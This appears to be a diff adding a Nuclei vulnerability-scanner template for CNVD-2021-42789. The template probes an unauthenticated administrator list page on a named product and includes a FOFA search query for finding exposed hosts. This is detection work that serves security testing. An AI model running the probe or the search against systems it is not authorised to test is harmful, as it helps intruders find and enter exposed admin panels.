@@ -1,0 +1,30 @@
+id: CNVD-2021-42789
+info:
+  name: demo
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/adysec/nuclei_poc/blob/8a9177f5def88209048c45c872eb22ea74b43ae8/tmp/cnvd/CNVD-2021-42789.yaml#L4
+  classification:
+    cve-id: CNVD-2021-42789
+  metadata:
+    verified: false
+    fofa-query: body="https://www.bjycxf.com" || icon_hash="-692947551"
+    tips:
+    repair:
+    version:
+  tags: bjycxf,unauth
+
+http:
+  - raw:
+      - |
+        GET /admin/admin/admin_list.html HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'添加','首页','管理员列表','导航元素')
+        condition: and
